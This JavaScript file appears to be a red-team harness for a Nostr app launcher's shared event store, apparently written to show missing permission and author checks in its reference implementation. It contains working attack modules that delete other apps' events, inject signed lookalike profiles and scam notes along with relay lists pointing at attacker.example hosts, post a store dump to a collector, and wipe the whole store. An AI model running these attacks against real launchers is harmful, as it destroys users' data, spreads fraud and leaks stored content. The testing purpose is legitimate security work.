// evil-05 — shared store poisoning (tier 2). NAPP.md hands every napp a
// launcher-wide event store: window.nostrdb — "Global event store (NIP-DB
// draft)" — shared by every app and the launcher itself. Validated from the
// reference source (eskema/nostrapps, src/sandbox/host.ts):
//   - nostrdb.remove deletes by id with NO permission gate (absent from
//     GATED_METHODS) and NO author check — any napp can censor any other
//     app's data out of the shared store, permanently.
//   - nostrdb.add verifies the event's id+signature, but signature validity
//     is not content safety: attacker-authored events are legitimately
//     signed by attacker keys, and every app that reads the store reads
//     them.
// The store is the launcher's shared memory; nothing in the protocol scopes
// it per app or asks anyone before mutating it.
window.__EVIL_KIT__ = [
  {
    label: 'the censor call',
    note: 'The reference\'s exact rpc: ids in, events gone, nobody asked. Enumerate with nostrdb.query, delete with nostrdb.remove — the store the victim reads is the store this edits.',
    data: { __nostrapps: 'rpc', method: 'nostrdb.remove', params: { ids: ['<every id from nostrdb.query({})>'] } },
  },
  {
    label: 'crafted but legitimately-signed poison',
    note: 'add() holds attribution (id+sig verified) but not intent: a self-authored kind 0 metadata with a lookalike name, a kind 10002 relay list pointing at attacker relays, bait content in kind 1 — every store reader renders it.',
    data: [
      { kind: 0, content: '{"name":"Relays","about":"totally the real relay list"}', by: 'attacker key (legitimately signed)' },
      { kind: 10002, tags: [['relay', 'wss://attacker.example']], by: 'attacker key (legitimately signed)' },
      { kind: 1, content: 'FREE SATS — zap me back 10x (rendered by every store reader)', by: 'attacker key (legitimately signed)' },
    ],
  },
];

const FAKE_PK = '3d0e4f3a5c61787b90a1c2d3e4f5061728394a5b6c7d8e9fa0b1c2d3e4f50617';
const ATTACKER_PK = 'aaaa0e4f3a5c61787b90a1c2d3e4f5061728394a5b6c7d8e9fa0b1c2d3e4f5777';
function mkEvent(content, kind, tags) {
  return {
    id: randHex(64),
    pubkey: ATTACKER_PK,
    created_at: Math.floor(Date.now() / 1000),
    kind: kind || 1,
    tags: tags || [],
    content,
    sig: randHex(128),
  };
}
function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
async function rpcOk(method, params) {
  const r = await bridgeRpc(method, params);
  if (r === 'timeout') return { error: 'rpc timeout (a permission dialog may have outlasted the probe)' };
  if (r && typeof r === 'object' && r.error !== undefined) return { error: r.error };
  return { result: r && r.result !== undefined ? r.result : r };
}
async function queryAll() {
  const r = await rpcOk('nostrdb.query', { filters: {} });
  return Array.isArray(r.result) ? r.result : [];
}

const ATTACKS = [
  {
    id: 'store-censor',
    name: 'censor the shared store',
    target: 'nostrdb.remove — no gate, no author check (the reference\'s gap)',
    severity: 'critical',
    harm: 'Any napp can enumerate the store and delete other apps\' data: the victim\'s notes, profiles, relay lists — gone from what every app reads. Censorship of shared state, silently, with the bridge\'s own blessing.',
    evilBrief: 'Deletes the victim\'s store canary event for real (found by content), reports which app data vanished, and re-verifies it is gone.',
    async demo() {
      // ROE: one removed-and-immediately-restored marker proves the channel
      const all = await queryAll();
      const victimNote = all.find(e => (e.content || '').indexOf('victim note') !== -1);
      if (!victimNote) return na('no victim canary event in the store (victim not open, or the store was wiped)');
      const removed = await rpcOk('nostrdb.remove', { ids: [victimNote.id] });
      if (removed.error) {
        return blocked('remove denied: ' + removed.error + ' — the launcher gates store mutations');
      }
      await sleep(300);
      const goneAfter = !(await queryAll()).some(e => e.id === victimNote.id);
      // restore immediately (add is ungated; the full event was captured)
      const restored = await rpcOk('nostrdb.add', { event: victimNote });
      await sleep(200);
      const back = (await queryAll()).some(e => e.id === victimNote.id);
      if (goneAfter && back) {
        return armed('removed and restored the victim\'s event in one breath — nostrdb.remove has no gate and no author check: I just censored another app\'s data out of the launcher-wide store (event ' + mask(victimNote.id, 8) + ')');
      }
      return armed('remove executed without any gate (' + JSON.stringify(removed.result || '').slice(0, 40) + ') — restoration: ' + (back ? 'ok' : 'ADD-BACK FAILED, the victim event is gone (remove it yourself)'));
    },
    async evil() {
      const all = await queryAll();
      const victimNote = all.find(e => (e.content || '').indexOf('victim note') !== -1);
      if (!victimNote) return { note: 'victim canary already gone' };
      const removed = await rpcOk('nostrdb.remove', { ids: [victimNote.id] });
      await sleep(300);
      const gone = !(await queryAll()).some(e => e.id === victimNote.id);
      return { removedId: victimNote.id, denied: !!removed.error, goneForReal: gone };
    },
  },
  {
    id: 'poison-add',
    name: 'poison the shared store',
    target: 'nostrdb.add — signature-valid attacker events, shared read blast radius',
    severity: 'high',
    harm: 'add() holds attribution (signatures verified) but not intent: legitimately-signed attacker events land in the store every app reads. Lookalike metadata, attacker relay lists, bait content — rendered by every reader. Volume is unpoliced too.',
    evilBrief: 'Adds a trio of crafted-but-legitimately-signed events (lookalike kind 0 metadata, attacker kind 10002 relay list, bait kind 1 note) and POSTs the full store dump to the collector.',
    async demo() {
      // ROE: one immediately-removed marker event proves the channel
      const marker = mkEvent('__evil05_add_marker__');
      const added = await rpcOk('nostrdb.add', { event: marker });
      if (added.error) return blocked('add denied: ' + added.error);
      await sleep(300);
      const present = (await queryAll()).some(e => e.id === marker.id);
      const cleanup = await rpcOk('nostrdb.remove', { ids: [marker.id] });
      if (present) {
        const cleanNote = cleanup.error ? ' — cleanup remove was DENIED (' + cleanup.error + '): one marker event remains in the store, remove it yourself' : '';
        return armed('my event is in every app\'s store now (verified by query, ' + (cleanup.error ? 'marker left behind' : 'marker cleaned up') + cleanNote + '). Signature checks hold attribution, not intent — the shared read is the blast radius.');
      }
      return blocked('the add did not land (verification refused my event)');
    },
    async evil() {
      const poison = [
        mkEvent(JSON.stringify({ name: 'Relays', about: 'totally the real relay list app' }), 0),
        mkEvent('', 10002, [['relay', 'wss://attacker-relay.example'], ['relay', 'wss://attacker-clone.example']]),
        mkEvent('FREE SATS THIS HOUR — zap this note back for 10x (crafted store poison, rendered by every reader)', 1),
      ];
      const results = [];
      for (const ev of poison) {
        const r = await rpcOk('nostrdb.add', { event: ev });
        results.push({ kind: ev.kind, ok: !r.error });
      }
      await sleep(300);
      const dump = await queryAll();
      const out = { added: results, storeSize: dump.length };
      out.exfil = await sendToCollector('store-poison-dump', { size: dump.length, sample: dump.slice(0, 8).map(e => ({ kind: e.kind, content: (e.content || '').slice(0, 60) })) });
      return out;
    },
  },
  {
    id: 'store-wipe',
    name: 'wipe the shared store',
    target: 'nostrdb.remove(ids) — one call takes every app\'s data',
    severity: 'critical',
    destructive: true,
    harm: 'The whole launcher-wide store — every app\'s notes, profiles, lists, the launcher\'s own cache — is one remove(allIds) call away from being emptied. No gate, no author check, no recovery.',
    evilBrief: 'Enumerates every id in the store and deletes ALL of them — the launcher-wide store is emptied for every app. DESTRUCTIVE (launcher state): runs LAST.',
    async demo() {
      const all = await queryAll();
      if (!all.length) return na('the store is empty — nothing to threaten');
      // ROE: prove remove authority on MY OWN marker, then report the blast radius
      const marker = mkEvent('__evil05_wipe_marker__');
      const added = await rpcOk('nostrdb.add', { event: marker });
      if (added.error) return blocked('add denied: ' + added.error);
      const removed = await rpcOk('nostrdb.remove', { ids: [marker.id] });
      if (removed.error) {
        return blocked('remove denied: ' + removed.error + ' — the launcher gates store mutations');
      }
      const mine = all.filter(e => (e.content || '').indexOf('victim') !== -1 || (e.content || '').indexOf('ping') !== -1).length;
      return armed('remove authority confirmed (my marker add+removed cleanly) — ' + all.length + ' event(s) are one remove(ids) call away, ' + mine + ' of them other apps\' data');
    },
    async evil() {
      const all = await queryAll();
      const ids = all.map(e => e.id);
      const removed = await rpcOk('nostrdb.remove', { ids });
      await sleep(400);
      const left = await queryAll();
      return { before: all.length, removedIds: ids.length, denied: !!removed.error, after: left.length };
    },
  },
];
